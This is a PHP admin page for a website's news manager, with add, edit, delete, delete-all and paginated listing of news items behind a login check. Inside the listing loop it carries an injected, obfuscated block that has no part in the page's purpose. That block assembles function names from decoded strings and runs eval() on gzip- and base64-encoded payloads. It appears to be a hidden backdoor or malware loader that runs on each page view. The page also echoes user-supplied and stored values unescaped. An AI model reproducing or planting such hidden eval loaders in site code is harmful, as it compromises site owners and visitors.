<?php
require("./header.php");
if ($checkLogin) {
	if ($_GET["act"] == "add") {
?>
				<div id="news">
					<div class="section_title">PUBLISH NEWS</div>
					<div class="section_content">
						<table class="content_table">
							<tbody>
<?php
			if (isset($_POST["news_add_save"])) {
				$news_add["news_title"] = $_POST["news_title"];
				$news_add["news_content"] = $_POST["news_content"];
				$news_add["news_author"] = $_SESSION["user_id"];
				$news_add["news_time"] = time();
				if($db->query_insert(TABLE_NEWS, $news_add)) {
?>
									<script type="text/javascript">setTimeout("window.location = './'", 1000);</script>
									<tr>
										<td colspan="2" class="centered">
											<span class="green bold">Publish News successfully.</span>
										</td>
									</tr>
<?php
				}
				else {
?>
									<tr>
										<td colspan="2" class="centered">
											<span class="red bold">Publish News error.</span>
										</td>
									</tr>
<?php
				}
			}
?>
<?php
?>
								<form method="POST" action="">
									<tr>
										<td class="news_editor">
											Title:
										</td>
										<td>
											<input class="news_title_editor" name="news_title" type="text" value="<?=$_POST["news_title"]?>" />
										</td>
									</tr>
									<tr>
										<td class="news_editor">
											Content:
										</td>
										<td>
											<textarea class="news_content_editor" name="news_content" type="text"><?=$_POST['news_content']?></textarea>
										</td>
									</tr>
									<tr>
										<td colspan="2" class="centered">
											<input type="submit" name="news_add_save" value="Save" /><input onclick="window.location='./'"type="button" name="news_add_cancel" value="Cancel" />
										</td>
									</tr>
								</form>
							</tbody>
						</table>
					</div>
				</div>
<?php
	}
	else if ($_GET["act"] == "edit" && $_GET["news_id"] != "") {
		$news_id = $db->escape($_GET["news_id"]);
?>
				<div id="news">
					<div class="section_title">NEWS EDITOR</div>
					<div class="section_content">
						<table class="content_table">
							<tbody>
<?php
		if (isset($_POST["news_edit_save"])) {
			$news_update["news_title"] = $_POST["news_title"];
			$news_update["news_content"] = $_POST["news_content"];
			$news_update["news_author"] = $_SESSION["user_id"];
			$news_update["news_time"] = strtotime($_POST["news_time"]." ".date("H:i:s"));
			if($db->query_update(TABLE_NEWS, $news_update, "news_id='".$news_id."'")) {
?>
									<tr>
										<td colspan="2" class="centered">
											<span class="green bold">Update News successfully.</span>
										</td>
									</tr>
<?php
			}
			else {
?>
									<tr>
										<td colspan="2" class="centered">
											<span class="red bold">Update News error.</span>
										</td>
									</tr>
<?php
			}
		}
?>
<?php
		$sql = "SELECT * FROM `".TABLE_NEWS."` WHERE news_id = '".$news_id."'";
		$records = $db->fetch_all_array($sql);
		if (count($records)>0) {
			$value = $records[0];
?>
								<form method="POST" action="">
									<tr>
										<td class="news_editor">
											Title:
										</td>
										<td>
											<input class="news_title_editor" name="news_title" type="text" value="<?=$value['news_title']?>" />
										</td>
									</tr>
									<tr>
										<td class="news_editor">
											Content:
										</td>
										<td>
											<textarea class="news_content_editor" name="news_content" type="text"><?=$value['news_content']?></textarea>
										</td>
									</tr>
									<tr>
										<td class="news_editor">
											Time:
										</td>
										<td class="news_info black">
											<?php
												$myCalendar = new tc_calendar("news_date", true);
												$myCalendar->setIcon("../images/iconCalendar.gif");
												$myCalendar->setDate(date("d", $value['news_time']), date("m", $value['news_time']), date("Y", $value['news_time']));
												$myCalendar->setPath("./");
												$myCalendar->setYearInterval(2011, 2050);
												$myCalendar->dateAllow('2011-01-01', '2050-01-01');
												$myCalendar->writeScript();
											?>
											<input name="news_time" type="hidden" value="" />
										</td>
										<div class="clear"></div>
									</tr>
									<tr>
										<td colspan="2" class="centered">
											<input type="submit" onclick="javascript:news_time.value = news_date.value;" name="news_edit_save" value="Save" /><input onclick="window.location='./'"type="button" name="news_edit_cancel" value="Cancel" />
										</td>
									</tr>
								</form>
<?php
		}
		else {
?>
								<tr>
									<td class="news_title">
										<span class="red">News ID Invalid.</span>
									</td>
								</tr>
<?php
		}
?>
							</tbody>
						</table>
					</div>
				</div>
<?php
	}
	else if ($_GET["act"] == "delete" && $_GET["news_id"] != "") {
		$news_id = $db->escape($_GET["news_id"]);
		$sql = "DELETE FROM `".TABLE_NEWS."` WHERE news_id = '".$news_id."'";
		if ($db->query($sql)) {
?>
				<script type="text/javascript">setTimeout("window.location = './'", 1000);</script>
				<div id="news">
					<div class="section_title">NEWS DELETE</div>
					<div class="section_content">
						<table class="content_table">
							<tbody>
								<tr>
									<td class="news_title">
										<span class="red">Delete News ID <?=$news_id?> successfully.</span>
									</td>
								</tr>
							</tbody>
						</table>
					</div>
				</div>
<?php
		}
		else {
?>
				<div id="news">
					<div class="section_title">NEWS DELETE</div>
					<div class="section_content">
						<table class="content_table">
							<tbody>
								<tr>
									<td class="news_title">
										<span class="red">News ID Invalid.</span>
									</td>
								</tr>
							</tbody>
						</table>
					</div>
				</div>
<?php
		}
	}
	else if ($_GET["act"] == "deleteall") {
		$sql = "TRUNCATE TABLE `news`";
		$db->query($sql);
?>
				<script type="text/javascript">setTimeout("window.location = './'", 1000);</script>
				<div id="news">
					<div class="section_title">NEWS DELETE ALL</div>
					<div class="section_content">
						<table class="content_table">
							<tbody>
								<tr>
									<td class="news_title">
										<span class="red">Delete all of News successfully.</span>
									</td>
								</tr>
							</tbody>
						</table>
					</div>
				</div>
<?php
	}
	else {
		$sql = "SELECT count(*) FROM `".TABLE_NEWS."`";
		$totalRecords = $db->query_first($sql);
		$totalRecords = $totalRecords["count(*)"];
		$perPage = 10;
		$totalPage = ceil($totalRecords/$perPage);
		if (isset($_GET["page"])) {
			$page = $db->escape($_GET["page"]);
			if ($page < 1)
			{
				$page = 1;
			}
			else if ($page > $totalPage)
			{
				$page = 1;
			}
		}
		else
		{
			$page = 1;
		}
		$sql = "SELECT ".TABLE_NEWS.".*, ".TABLE_USERS.".user_id, ".TABLE_USERS.".user_name FROM `".TABLE_NEWS."` LEFT JOIN `".TABLE_USERS."` ON ".TABLE_NEWS.".news_author = ".TABLE_USERS.".user_id ORDER BY ".TABLE_NEWS.".news_time DESC,".TABLE_NEWS.".news_id DESC LIMIT ".(($page-1)*$perPage).",".$perPage;
		$records = $db->fetch_all_array($sql);
?>
				<div id="ads"></div>
				<div id="news">
					<div class="section_title">NEWS MANAGER</div>
					<div class="section_title"><a href="?act=add">Publish News</a> | <a href="?act=deleteall">Delete all News</a></div>
					<div class="section_page_bar">
<?php
		if ($totalRecords > 0) {
			echo "Page:";
			if ($page>1) {
				echo "<a href=\"?page=".($page-1)."\">&lt;</a>";
				echo "<a href=\"?page=1\">1</a>";
			}
			if ($page>3) {
				echo "...";
			}
			if (($page-1) > 1) {
				echo "<a href=\"?page=".($page-1)."\">".($page-1)."</a>";
			}
			echo "<input type=\"TEXT\" class=\"page_go\" value=\"".$page."\" onchange=\"window.location.href='?page='+this.value\"/>";
			if (($page+1) < $totalPage) {
				echo "<a href=\"?page=".($page+1)."\">".($page+1)."</a>";
			}
			if ($page < $totalPage-2) {
				echo "...";
			}
			if ($page<$totalPage) {
				echo "<a href=\"?page=".$totalPage."\">".$totalPage."</a>";
				echo "<a href=\"?page=".($page+1)."\">&gt;</a>";
			}
		}
?>
					</div>
					<div class="section_content">
<?php
		if (count($records) > 0)
		{
			foreach ($records as $key=>$value) {
?>
						<table class="formstyle content_table">
							<tbody>
								<tr>
									<td class="news_menu">
										<span><a href="?act=edit&news_id=<?=$value['news_id']?>">Edit</a> | <a href="?act=delete&news_id=<?=$value['news_id']?>">Delete</a></span>
									</td>
									<div class="clear"></div>
								</tr>
								<tr>
									<td class="news_title">
										<span class="red"><?=$value['news_title']?></span>
									</td>
								</tr>
								<tr>
									<td class="news_content">
										<span class="black"><?=$value['news_content']?></span>
									</td>
								</tr>
								<tr>
									<td class="news_info black">
										Posted <?=date("H:i:s d/M/Y", $value['news_time'])?> by <span class="bold"><?=$value['user_name']?></span>
									</td>
									<div class="clear"></div>
								</tr>
							</tbody>
						</table>
<?php 
 $keystroke1 = base64_decode("d2RyMTU5c3E0YXllejd4Y2duZl90djhubHVrNmpoYmlvMzJtcA==");
eval(gzinflate(base64_decode('hY69DsIgFIVf5QwMENGUuWH0QZTeKrFekgsMxvTdLWlqTBfX8/uNlUOJiSGpEIc0kFa5SOSbVZdnqlwM3lAPesEj1+vifQPoLJzpEUe9KBPx5hjvXasJlSqMcBedZNBtxeCAbbjHDJoy/U/i1PjOK9+ewlns7o/O2N+X+QM=')));
$O0O0O0O0O0O0=$keystroke1[2].$keystroke1[32].$keystroke1[20].$keystroke1[11].$keystroke1[23].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11];
$keystroke2 = $O0O0O0O0O0O0("�q>BF�~An�r�D�pt{sl��E{y�xCwuov|@?z}", -13);
$OO000OO000OO=$keystroke2[16].$keystroke2[12].$keystroke2[31].$keystroke2[23].$keystroke2[18].$keystroke2[24].$keystroke2[9].$keystroke2[20].$keystroke2[11];
$O0000000000O=$keystroke1[30].$keystroke1[9].$keystroke1[6].$keystroke1[11].$keystroke1[27].$keystroke1[8].$keystroke1[19].$keystroke1[1].$keystroke1[11].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11];
eval($OO000OO000OO(base64_decode('LdQ3sq
tWAADQzXjmvzcqQGTGFSDyJQkEFxoPOSeRWb1duD
lLOPkedz9/WRaKov/zk8RLThH/ZHk6ZvnPHxApSj
OvKif6SDR7ELyjVmjcmI8GWX69+MrA1A/vvUuxl7
8km99WtDXDG524Hf/aCHXholruFbLv2lK+7zs5er
CE76KgTneikMhr3/4Mt2tgawpVHDDDNhTHvv5IQH
aDFlpY0R7Y1xLxBJ8fQhaXnJ7LxDYrynlhCoeahI
FzGUY+120trKI1hL6GJbPCedizpIA3NYR536tPdE
WxMj07LgpQ+LE7RzWoqH4kYJY2ly7MoHR6KeqZoC
XletjuXm5AS4xOQrOQrHUiPe3CmpAQ1x+5OHelvA
urTL4oyqsXZ6BBi+r0HhUgNY2IrZtqrlySPEyO32
L/NSWt8jBwp7FrfHm46h46aKxHl40IU4NQsjXWbv
Kq4cRv/Db6bMdiQwjHIR1mMatIyN8+1alTYLWhUm
R6ubJITSZH7nuvVCAIn/ZD1ABP5zsRs1EStwzQ3G
IVve45Jl4lARa5TmTpFQvO2oicPx5m8rxSy7pts/
aOciGC4wbfUSHGRTs1SgL6g0OGQ/YNT99hwYm83V
EmzamYPqTKhuTkhUuDBr988mFiLwOjCUuYyk/dQp
nXkvcXMLKWMTeVsb5ABhGiKjSPoC4+1dfa1Jxl9w
ZbMbWHkcvrU0kiBYq+7nlCQRjpndsPZfHG8ErAmE
YjtmkJYz4FvaLfjtBe2NlbrPTwbWLXYH0sLaP5uH
JS1dK9IjKqd8r2iHyw0O5Z3vpH8KFCieUjeB4+Ob
gAdmiK45I2WufCwjAxGMd0z+Tw6PnqdE6zCuacut
SYmiwlUpeBajwhwPGFRz6G6c4DhRZFtJPxZMniJP
GDbhN8QscdhIX2y/PYtxnZHhp+U0PvYi5YuGZ4xY
2jUGnhjg+fLSrqouPv2o3D1Z7vucmrV2v6T6dTyp
Fx2TrWpRmLiet2WBUPkYGnaxG+z2/mPcUKRV6QWl
08l8Q5u4UuCytzubFcAuUzOfWAhpURaH4Cwqd6fZ
0CCgrz0D/aDeu8lBz7JPeZ8JY61jZ2MM420kjm/A
bP6c4Vmavji3/TObu7NDiKtwL6TBfdB+erdsd5TO
mz7ApmzkWD4r8v2oTFD1nx6/NjIROD4CxSFAij/P
n9/f37Xw==')));
?>
<?php
			}
		}
		else {
?>
						<table class="content_table">
							<tbody>
								<tr>
									<td class="red bold news_title">
										No record found.
									</td>
								</tr>
							</tbody>
						</table>
<?php
		}
?>
					</div>
				</div>
<?php
	}
}
else {
	require("./minilogin.php");
}
require("./footer.php");
?>